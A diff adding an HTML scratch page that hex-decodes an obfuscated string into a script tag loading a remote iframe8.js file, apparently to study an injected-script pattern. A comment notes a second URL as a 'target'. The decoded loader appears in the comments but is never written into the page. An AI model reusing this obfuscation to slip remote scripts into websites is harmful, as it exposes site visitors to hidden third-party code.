@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head lang="en">
+<meta charset="UTF-8">
+<title>js调用反向解密</title>
+<script type="text/javascript">
+
+var rs_cd="3c736372697074207372633d68"; 
+rs_cd+="7474703a2f2f612e3639383839392e636f6"; 
+rs_cd+="d2f696672616d65382e6a733e3c2f7363726970743e"; 
+//console.log(rs_cd);
+//3c736372697074207372633d687474703a2f2f612e3639383839392e636f6d2f696672616d65382e6a733e3c2f7363726970743e
+//alert(rs_cd);
+var rs_ct = ""; 
+
+for (var i = 0; i < rs_cd.length; i += 2) { 
+    var rs_ch = parseInt(rs_cd.substring(i, i + 2), 16); 
+    //console.log(rs_cd.substring(i, i + 2));
+    //console.log(parseInt(rs_cd.substring(i, i + 2), 16));
+    //console.log(rs_ch);
+   // alert(rs_ch);
+    rs_ct += String.fromCharCode(rs_ch); 
+    //console.log(rs_ct);
+}
+//console.log(rs_ch);
+//alert(rs_ct);
+//<script src=http://a.698899.com/iframe8.js>< /script>
+//目标
+//www.wasyy.cn/static/js/js.js
+
+var myurl = "www.wasyy.cn/static/js/js.js";
+//var c = "aaa ccc";
+//console.log(c.length);
+for(var i=0;i<myurl.length;i++){
+	
+}
+/* console.log(myurl.charCodeAt(0));
+console.log(myurl.charCodeAt(1));
+console.log(myurl.charCodeAt(2));
+console.log(myurl.charCodeAt(3));
+console.log(String.fromCharCode(119));
+console.log(String.fromCharCode(46)); */
+
+</script>
+
+</head>
+<body>
+
+
+	<p>
+	http://static.com/jquery/bindEvent.html
+	</p>
+	<button id="clickMeBtn">click me</button>
+
+</body>
+</html>
